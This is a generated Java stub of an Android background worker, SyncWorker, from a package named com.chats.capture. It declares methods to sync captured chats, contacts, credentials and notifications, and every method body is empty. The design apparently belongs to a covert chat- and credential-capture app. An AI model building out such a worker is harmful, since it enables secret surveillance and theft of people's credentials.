package com.chats.capture.workers;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000L\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\b\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0002\u0018\u00002\u00020\u0001B\u0015\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u0012\u0006\u0010\u0004\u001a\u00020\u0005\u00a2\u0006\u0002\u0010\u0006J\u000e\u0010\u0007\u001a\u00020\bH\u0096@\u00a2\u0006\u0002\u0010\tJ\u0010\u0010\n\u001a\u00020\u000b2\u0006\u0010\u0002\u001a\u00020\u0003H\u0002J\u0016\u0010\f\u001a\u00020\r2\u0006\u0010\u000e\u001a\u00020\u000fH\u0082@\u00a2\u0006\u0002\u0010\u0010J\u0016\u0010\u0011\u001a\u00020\r2\u0006\u0010\u0012\u001a\u00020\u0013H\u0082@\u00a2\u0006\u0002\u0010\u0014J\u0016\u0010\u0015\u001a\u00020\r2\u0006\u0010\u0016\u001a\u00020\u0017H\u0082@\u00a2\u0006\u0002\u0010\u0018J\u0016\u0010\u0019\u001a\u00020\r2\u0006\u0010\u001a\u001a\u00020\u001bH\u0082@\u00a2\u0006\u0002\u0010\u001c\u00a8\u0006\u001d"}, d2 = {"Lcom/chats/capture/workers/SyncWorker;", "Landroidx/work/CoroutineWorker;", "context", "Landroid/content/Context;", "params", "Landroidx/work/WorkerParameters;", "(Landroid/content/Context;Landroidx/work/WorkerParameters;)V", "doWork", "Landroidx/work/ListenableWorker$Result;", "(Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getBatteryLevel", "", "syncChats", "", "chatDao", "Lcom/chats/capture/database/ChatDao;", "(Lcom/chats/capture/database/ChatDao;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "syncContacts", "contactDao", "Lcom/chats/capture/database/ContactDao;", "(Lcom/chats/capture/database/ContactDao;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "syncCredentials", "credentialDao", "Lcom/chats/capture/database/CredentialDao;", "(Lcom/chats/capture/database/CredentialDao;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "syncNotifications", "notificationDao", "Lcom/chats/capture/database/NotificationDao;", "(Lcom/chats/capture/database/NotificationDao;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "app_debug"})
public final class SyncWorker extends androidx.work.CoroutineWorker {
    
    public SyncWorker(@org.jetbrains.annotations.NotNull()
    android.content.Context context, @org.jetbrains.annotations.NotNull()
    androidx.work.WorkerParameters params) {
        super(null, null);
    }
    
    @java.lang.Override()
    @org.jetbrains.annotations.Nullable()
    public java.lang.Object doWork(@org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super androidx.work.ListenableWorker.Result> $completion) {
        return null;
    }
    
    /**
     * Get current battery level percentage
     */
    private final int getBatteryLevel(android.content.Context context) {
        return 0;
    }
    
    private final java.lang.Object syncNotifications(com.chats.capture.database.NotificationDao notificationDao, kotlin.coroutines.Continuation<? super kotlin.Unit> $completion) {
        return null;
    }
    
    private final java.lang.Object syncChats(com.chats.capture.database.ChatDao chatDao, kotlin.coroutines.Continuation<? super kotlin.Unit> $completion) {
        return null;
    }
    
    private final java.lang.Object syncCredentials(com.chats.capture.database.CredentialDao credentialDao, kotlin.coroutines.Continuation<? super kotlin.Unit> $completion) {
        return null;
    }
    
    private final java.lang.Object syncContacts(com.chats.capture.database.ContactDao contactDao, kotlin.coroutines.Continuation<? super kotlin.Unit> $completion) {
        return null;
    }
}